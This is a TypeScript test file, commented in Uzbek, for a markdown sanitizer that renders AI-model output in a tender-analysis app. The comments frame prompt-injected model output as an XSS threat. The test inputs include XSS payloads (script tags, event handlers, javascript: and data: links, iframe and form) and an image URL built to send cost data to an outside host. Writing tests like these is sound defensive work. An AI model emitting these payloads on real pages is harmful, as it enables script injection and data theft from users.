/**
 * SINOV: markdown renderi — HUJUM VEKTORLARI
 * ══════════════════════════════════════════
 * Nega alohida sinov: bu yer PROMPT INJECTION zanjirining oxirgi bo'g'ini.
 * Model chiqishi ishonchsiz, uning ichida esa tender hujjatidan kelgan
 * bo'laklar bor. Sanitizator yiqilsa — XSS.
 *
 * Ishga tushirish (loyiha ildizidan):
 *     cd frontend && npm run test:markdown
 *
 * Node 24 TypeScript'ni to'g'ridan-to'g'ri yurgizadi — qo'shimcha vosita
 * (vitest/tsx) kerak emas. `jsdom` esa kerak: DOMPurify brauzer DOM'iga
 * tayanadi va Node'da u yo'q.
 */
import { JSDOM } from 'jsdom'

// DOM ni `markdown.ts` import qilinishidan OLDIN o'rnatamiz — DOMPurify
// yuklanish paytida `window` ni qidiradi.
const dom = new JSDOM('<!doctype html><html><body></body></html>')
const g = globalThis as unknown as Record<string, unknown>
g.window = dom.window
g.document = dom.window.document
g.Node = dom.window.Node
g.DocumentFragment = dom.window.DocumentFragment
g.HTMLTemplateElement = dom.window.HTMLTemplateElement
g.NodeFilter = dom.window.NodeFilter
g.trustedTypes = undefined

const { renderMarkdown, renderPlain } = await import('./markdown.ts')

let ok = 0
const fail: string[] = []

function check(name: string, cond: boolean, detail = ''): void {
  if (cond) {
    ok++
    console.log(`  OK   ${name}`)
  } else {
    fail.push(name)
    console.log(`  FAIL ${name}${detail ? `\n       ${detail}` : ''}`)
  }
}

/** Natijada XAVFLI qism qolmaganini tekshiradi. */
function xavfsiz(name: string, input: string, taqiqlangan: RegExp[]): void {
  const out = renderMarkdown(input)
  const topildi = taqiqlangan.filter((re) => re.test(out))
  check(name, topildi.length === 0,
    `chiqish: ${out.slice(0, 110)}\n       topildi: ${topildi.map(String).join(', ')}`)
}

console.log('='.repeat(62))
console.log('MARKDOWN SANITIZATSIYASI — hujum vektorlari')
console.log('='.repeat(62))

// ---------------------------------------------------------------------------
console.log('\n[1] Skript ijrosi')
xavfsiz('<script> tushib qoladi',
  'Salom <script>alert(1)</script> xayr', [/<script/i, /alert\(1\)/])
xavfsiz('kodlangan <script>',
  'Salom &lt;script&gt;alert(1)&lt;/script&gt;', [/<script/i])
xavfsiz('markdown ichidagi xom HTML skript',
  '# Sarlavha\n\n<script>fetch("//tashqi.uz")</script>', [/<script/i, /fetch\(/])

// ---------------------------------------------------------------------------
console.log('\n[2] Hodisa atributlari')
xavfsiz('<img onerror>',
  '<img src=x onerror="alert(1)">', [/onerror/i, /<img/i])
xavfsiz('<div onclick>',
  '<div onclick="alert(1)">bosing</div>', [/onclick/i])
xavfsiz('<svg onload>',
  '<svg onload="alert(1)"></svg>', [/onload/i, /<svg/i])

// ---------------------------------------------------------------------------
console.log('\n[3] Havolalar — <a> UMUMAN taqiqlangan')
xavfsiz('javascript: havola',
  '[bosing](javascript:alert(1))', [/javascript:/i, /<a[\s>]/i])
xavfsiz('oddiy tashqi havola ham chiqmaydi',
  '[sayt](https://tashqi.uz/?d=sir)', [/<a[\s>]/i, /href/i])
xavfsiz('data: URI havola',
  '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  [/<a[\s>]/i, /data:text\/html/i])

// ---------------------------------------------------------------------------
console.log('\n[4] Rasm — MA\'LUMOT CHIQARISH kanali')
xavfsiz('markdown rasm tushib qoladi',
  '![alt](https://tashqi.uz/piksel.png?d=tannarx)',
  [/<img/i, /tashqi\.uz/])
xavfsiz('xom <img> tegi',
  '<img src="https://tashqi.uz/x.png">', [/<img/i, /src=/i])

// ---------------------------------------------------------------------------
console.log('\n[5] Ramka va forma')
xavfsiz('<iframe>', '<iframe src="//tashqi.uz"></iframe>', [/<iframe/i])
xavfsiz('<form> + <input>',
  '<form action="//tashqi.uz"><input name="p"></form>', [/<form/i, /<input/i])
xavfsiz('<style>', '<style>body{display:none}</style>', [/<style/i])

// ---------------------------------------------------------------------------
console.log('\n[6] Atributlar UMUMAN qolmaydi')
{
  const out = renderMarkdown('<p class="x" id="y" style="color:red">matn</p>')
  check('class/id/style tushib qoladi',
    !/class=|id=|style=/i.test(out), `chiqish: ${out.slice(0, 90)}`)
  check('matnning o\'zi qoladi', /matn/.test(out), `chiqish: ${out.slice(0, 90)}`)
}

// ---------------------------------------------------------------------------
console.log('\n[7] Foydali formatlash SAQLANADI')
{
  const out = renderMarkdown('**qalin** va *kursiv*\n\n- bir\n- ikki')
  check('qalin matn', /<strong>qalin<\/strong>/.test(out), out.slice(0, 90))
  check('ro\'yxat', /<ul>[\s\S]*<li>bir<\/li>/.test(out), out.slice(0, 90))
}
{
  const md = '| Tender | Ball |\n|---|---|\n| 123 | 87 |'
  const out = renderMarkdown(md)
  check('GFM jadval', /<table>/.test(out) && /<td>123<\/td>/.test(out),
    out.slice(0, 130))
}
{
  const out = renderMarkdown('`kod` va\n\n```\nblok\n```')
  check('kod', /<code>kod<\/code>/.test(out), out.slice(0, 90))
}
{
  const out = renderMarkdown('### Uch\n\n# Bir')
  check('h3 qoladi', /<h3>Uch<\/h3>/.test(out), out.slice(0, 90))
  check('h1 tushib qoladi (matn qoladi)',
    !/<h1>/.test(out) && /Bir/.test(out), out.slice(0, 90))
}

// ---------------------------------------------------------------------------
console.log('\n[8] Zaxira rejim (kutubxonasiz)')
{
  const out = renderPlain('<script>alert(1)</script>\nikkinchi qator')
  check('renderPlain HTML ni ekranlaydi',
    !/<script/.test(out) && /&lt;script&gt;/.test(out), out.slice(0, 80))
  check('qator uzilishi saqlanadi', /<br>/.test(out), out.slice(0, 80))
}
{
  check('bo\'sh kirish', renderMarkdown('') === '')
  check('null-ga o\'xshash kirish',
    renderMarkdown(undefined as unknown as string) === '')
}

// ---------------------------------------------------------------------------
console.log('\n[9] Manba raqamlari — [3] bosiladigan bo\'ladi')
{
  const out = renderMarkdown('Kafolat muddati 12 oy [3].')
  check('[3] sup ga aylandi',
    /<sup[^>]*data-manba="3"[^>]*>\[3\]<\/sup>/.test(out), out.slice(0, 140))
  check('matn saqlanib qoldi', /Kafolat muddati 12 oy/.test(out), out.slice(0, 90))
}
{
  const out = renderMarkdown('Bir da\'vo ikki manba [3][7].')
  check('ketma-ket ikkita raqam',
    (out.match(/data-manba=/g) || []).length === 2, out.slice(0, 160))
}
{
  // KOD BLOKIDAGI [3] — iqtibos EMAS, massiv indeksi bo'lishi mumkin.
  const out = renderMarkdown('`arr[3]` va matnda [4]')
  check('<code> ichidagi [3] tegilmaydi',
    /<code>arr\[3\]<\/code>/.test(out), out.slice(0, 160))
  check('kod tashqarisidagi [4] belgilanadi',
    /data-manba="4"/.test(out), out.slice(0, 160))
}
{
  const out = renderMarkdown('```\nx = a[1]\n```')
  check('<pre> ichidagi [1] tegilmaydi',
    !/data-manba/.test(out), out.slice(0, 140))
}
{
  // RAQAM BO'LMAGAN qavs — o'zgarmasin.
  const out = renderMarkdown('Ro\'yxat [a] va [<script>] va [] bo\'sh')
  check('raqamsiz qavs o\'zgarmaydi', !/data-manba/.test(out), out.slice(0, 160))
  check('qavs ichidagi teg baribir ekranlangan',
    !/<script/.test(out), out.slice(0, 160))
}
{
  // 4 xonali raqam — `\d{1,3}` chegarasi.
  const out = renderMarkdown('[1234] va [999]')
  check('999 belgilanadi', /data-manba="999"/.test(out), out.slice(0, 140))
  check('1234 belgilanmaydi', !/data-manba="1234"/.test(out), out.slice(0, 140))
}
{
  // Model atribut yozishga urinsa — baribir tushib qoladi.
  const out = renderMarkdown('<sup data-manba="9" onclick="alert(1)">[9]</sup>')
  check('model yozgan onclick tushib qoladi', !/onclick/i.test(out), out.slice(0, 160))
}
{
  // Jadval katagidagi raqam ham ishlashi kerak — javoblar ko'pincha jadval.
  const out = renderMarkdown('| a | b |\n|---|---|\n| 12 oy [5] | ha |')
  check('jadval katagida [5]', /data-manba="5"/.test(out), out.slice(0, 220))
}

// ---------------------------------------------------------------------------
console.log('\n' + '='.repeat(62))
console.log(`NATIJA: ${ok}/${ok + fail.length} o'tdi`)
fail.forEach((n) => console.log(`  FAIL: ${n}`))
console.log('='.repeat(62))
process.exit(fail.length ? 1 : 0)
